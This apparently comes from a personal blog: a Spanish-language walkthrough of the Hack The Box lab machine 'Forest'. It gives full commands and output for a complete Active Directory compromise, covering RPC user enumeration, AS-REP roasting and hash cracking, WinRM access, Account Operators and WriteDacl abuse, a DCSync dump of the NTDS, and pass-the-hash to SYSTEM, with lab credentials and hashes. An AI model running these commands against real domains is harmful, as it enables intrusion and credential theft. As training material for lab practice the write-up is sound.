---
layout: post
title: Forest
date: 2023-02-15
description:
img:
fig-caption:
tags: [OSCP, OSEP]
---
___

<center><img src="/writeups/assets/img/Forest-htb/Forest.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Consultas DNS

* Enumeración por RPC

* ASPRepRoast Attack

* Enumeración con BloodHound

* Abuso del grupo Account Operators (Escalada de Privilegios)

* Abuso del privilegio WriteDacl (Escalada de Privilegios)

* DCSync Attack

* PassTheHash

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.161 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-15 14:44 GMT
Nmap scan report for 10.10.10.161
Host is up (0.056s latency).
Not shown: 65322 closed tcp ports (reset), 189 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49703/tcp open  unknown
49929/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 21.88 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49703,49929 10.10.10.161 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-15 14:45 GMT
Nmap scan report for 10.10.10.161
Host is up (0.34s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-02-15 14:52:11Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49703/tcp open  msrpc        Microsoft Windows RPC
49929/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h46m50s, deviation: 4h37m09s, median: 6m48s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-02-15T06:53:08-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2023-02-15T14:53:09
|_  start_date: 2023-02-15T08:58:02
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.54 seconds
```

Añado el dominio ```htb.local``` al ```/etc/hosts```

## Puerto 53 (DNS)

Pruebo a efectuar un ataque de transferencia de zona, con el fin de encontrar nuevos DNS records

```null
dig @10.10.10.161 htb.local axfr

; <<>> DiG 9.18.8-1-Debian <<>> @10.10.10.161 htb.local axfr
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

No encuentro nada, pero si enumerando los servidores de correo

```null
dig @10.10.10.161 htb.local mx

; <<>> DiG 9.18.8-1-Debian <<>> @10.10.10.161 htb.local mx
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 12912
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
; COOKIE: 0613e71a046bcc56 (echoed)
;; QUESTION SECTION:
;htb.local.			IN	MX

;; AUTHORITY SECTION:
htb.local.		3600	IN	SOA	forest.htb.local. hostmaster.htb.local. 106 900 600 86400 3600

;; Query time: 175 msec
;; SERVER: 10.10.10.161#53(10.10.10.161) (UDP)
;; WHEN: Wed Feb 15 14:47:57 GMT 2023
;; MSG SIZE  rcvd: 104
```

Añado estos subdominos al ```/etc/hosts```

## Puerto 445 (SMB)

Con crackmapexec aplico un escano para detectar dominio, hostname y versiones

```null
crackmapexec smb 10.10.10.161
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
```
No puedo listar los recursos compartidos

```null
smbmap -H 10.10.10.161 -u 'null'
[!] Authentication error on 10.10.10.161
```

## Puerto 135 (RPC)

Puedo conectarme con ```rpcclient``` haciendo uso de un null sesion

```null
rpcclient 10.10.10.161 -U "" -N
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
user:[john] rid:[0x2582]
user:[whytho] rid:[0x2583]
rpcclient $> 
```

Almaceno a todos los usuarios en un diccionario

```null
rpcclient 10.10.10.161 -U "" -N -c 'enumdomusers' | grep -oP '\[.*?\]' | tr -d "[]" | grep -v "0x" > users
```

Los valido con ```kerbrute``` y uno de ellos es ASPReproasteable (No requiere de autenticación previa de Kerberos)

```null
kerbrute userenum -d htb.local --dc 10.10.10.161 users

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 02/15/23 - Ronnie Flathers @ropnop

2023/02/15 14:54:58 >  Using KDC(s):
2023/02/15 14:54:58 >  	10.10.10.161:88

2023/02/15 14:54:59 >  [+] VALID USERNAME:	Administrator@htb.local
2023/02/15 14:54:59 >  [+] VALID USERNAME:	HealthMailboxc3d7722@htb.local
2023/02/15 14:54:59 >  [+] VALID USERNAME:	HealthMailboxfd87238@htb.local
2023/02/15 14:54:59 >  [+] VALID USERNAME:	HealthMailbox83d6781@htb.local
2023/02/15 14:54:59 >  [+] VALID USERNAME:	HealthMailboxfc9daad@htb.local
2023/02/15 14:54:59 >  [+] VALID USERNAME:	HealthMailboxc0a90c9@htb.local
2023/02/15 14:54:59 >  [+] VALID USERNAME:	HealthMailbox968e74d@htb.local
2023/02/15 14:54:59 >  [+] VALID USERNAME:	HealthMailbox670628e@htb.local
2023/02/15 14:54:59 >  [+] VALID USERNAME:	HealthMailbox6ded678@htb.local
2023/02/15 14:54:59 >  [+] VALID USERNAME:	HealthMailbox7108a4e@htb.local
2023/02/15 14:54:59 >  [+] VALID USERNAME:	andy@htb.local
2023/02/15 14:54:59 >  [+] VALID USERNAME:	santi@htb.local
2023/02/15 14:54:59 >  [+] VALID USERNAME:	mark@htb.local
2023/02/15 14:54:59 >  [+] VALID USERNAME:	lucinda@htb.local
2023/02/15 14:54:59 >  [+] VALID USERNAME:	HealthMailbox0659cc1@htb.local
2023/02/15 14:54:59 >  [+] VALID USERNAME:	sebastien@htb.local
2023/02/15 14:54:59 >  [+] VALID USERNAME:	HealthMailboxb01ac64@htb.local
2023/02/15 14:54:59 >  [+] svc-alfresco has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$svc-alfresco@HTB.LOCAL:214fa04454fa11ccc3fee28f4db1ab4b$c9cc1bd3141862f827fb04ad84f74fb60934d3ef7cb6c06c1cb4f62d283ecd716b4bd1c65798a609a6ee0d45a8031510c05daca17b1ce0339ea714255ddf86f075ced2dd8edeed77d063023b021b84d1b805e4147b85e66b85f718813c74646e012101ff35d93f4937ecc3f792468498da21a8971a11d3e9c0cd460d1a20c0804802e267ff1f9478bae1d1140baa1d64ab545996657ce95b058ff8a0b4e71c272745d703bfc44c47ac00b8db66b8ca019afde9686784dc54ba0f3f66ac9d0334b715c793dcf97040bbf5761f1912fa994099b2591cda46bb3f1f899bdadfa2d23b56906d3df1ae45aef60af25771c55c1d8f55a2c2ccdbed5ef2
2023/02/15 14:54:59 >  [+] VALID USERNAME:	svc-alfresco@htb.local
2023/02/15 14:54:59 >  [+] VALID USERNAME:	whytho@htb.local
2023/02/15 14:54:59 >  [+] VALID USERNAME:	john@htb.local
2023/02/15 14:54:59 >  Done! Tested 33 usernames (20 valid) in 1.026 seconds
```

Almaceno el hash en un archivo y lo crackeo con ```john```

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     
1g 0:00:00:03 DONE (2023-02-15 14:59) 0.2857g/s 1167Kp/s 1167Kc/s 1167KC/s s4552525..s3r1bu
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Teniendo la contraseña, la valido por SMB

```null
crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
```

En caso de que pertenezca al grupo ```Remote Management Users``` me podré conectar por ```winrm```

```null
crackmapexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
SMB         10.10.10.161    5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)
HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman
WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

Gano acceso al sistema

```null
evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```

Puedo visualizar la primera flag

```null
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
e02256aff4a5126160e00e45e0b2f4a4
```

# Escalada

Subo el ingestor ```SharpHound.exe``` para crear un zip con los datos necesarios para buscar formas de escalar privilegios desde BloodHound

```null
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> upload /opt/SharpHound.exe
Info: Uploading /opt/SharpHound.exe to C:\Users\svc-alfresco\Desktop\SharpHound.exe

                                                             
Data: 1211048 bytes of 1211048 bytes copied

Info: Upload successful!


```null
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> .\SharpHound.exe
2023-02-15T07:13:19.4881998-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-02-15T07:13:19.4881998-08:00|INFORMATION|Initializing SharpHound at 7:13 AM on 2/15/2023
2023-02-15T07:13:20.4725459-08:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-02-15T07:13:22.1131737-08:00|INFORMATION|Beginning LDAP search for htb.local
2023-02-15T07:13:22.4100460-08:00|INFORMATION|Producer has finished, closing LDAP channel
2023-02-15T07:13:22.4100460-08:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-02-15T07:13:52.1132626-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 45 MB RAM
2023-02-15T07:14:07.8476407-08:00|INFORMATION|Consumers finished, closing output channel
2023-02-15T07:14:07.8945148-08:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2023-02-15T07:14:08.1445704-08:00|INFORMATION|Status: 163 objects finished (+163 3.543478)/s -- Using 68 MB RAM
2023-02-15T07:14:08.1445704-08:00|INFORMATION|Enumeration finished in 00:00:46.0452993
2023-02-15T07:14:08.2545806-08:00|INFORMATION|SharpHound Enumeration Completed at 7:14 AM on 2/15/2023! Happy Graphing!
```

Descargo el comprimido y lo subo al neo4j

```null
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> download C:\Users\svc-alfresco\Desktop\20230215071407_BloodHound.zip /home/rubbx/Desktop/HTB/Machines/Forest/bh.zip
Info: Downloading C:\Users\svc-alfresco\Desktop\20230215071407_BloodHound.zip to /home/rubbx/Desktop/HTB/Machines/Forest/bh.zip

                                                             
Info: Download successful!
```

El vector de ataque sería el siguiente

<img src="/writeups/assets/img/Forest-htb/1.png" alt="">

Al tener un usuario que pertenece al grupo ```Account Operators```, es posible crear otro usuario e incorporarlo en otros grupos, ya que tiene ```GenericAll``` sobre otro grupo que a su vez tiene ```WriteDacl``` sobre el dominio, por lo que puedo tratar de efectuar un DCSync Attack para dumpearme el NTDS y convertirme en Domain Admin

```null
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net user rubbx rubbx123 /add /domain
The command completed successfully.
```

Para asignarle los privilegios necesarios para hacer el DCSync, tengo que añadirlo al grupo que puede hacer ```WriteDacl``` y modificar sus atributos para que pueda efectuar el DCSync

```null
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net group "Exchange Windows Permissions" rubbx /add
The command completed successfully.
```

Creo unas PSCredentials

```null
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $SecPassword = ConvertTo-SecureString 'rubbx123' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\rubbx', $SecPassword)
```

Subo el ```PowerView.ps1``` a la máquina víctima

```null
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> upload /opt/PowerSploit/Recon/PowerView.ps1
Info: Uploading /opt/PowerSploit/Recon/PowerView.ps1 to C:\Users\svc-alfresco\Desktop\PowerView.ps1

                                                             
Data: 1027036 bytes of 1027036 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -Rights DCSync -PrincipalIdentity rubbx
```

Ahora ya puedo dumpear el NTDS para hacer PassTheHash

```null
impacket-secretsdump htb.local/rubbx:rubbx123@10.10.10.161 | grep Administrator
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
```

Me conecto y veo la segunda flag

```null
impacket-psexec htb.local/Administrator@10.10.10.161 -hashes :32693b11e6aa90eb43d32c72a07ceea6
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file GsulebbO.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service nfus on 10.10.10.161.....
[*] Starting service nfus.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
e22a875d7ed259bdd469658eeeabadd5
```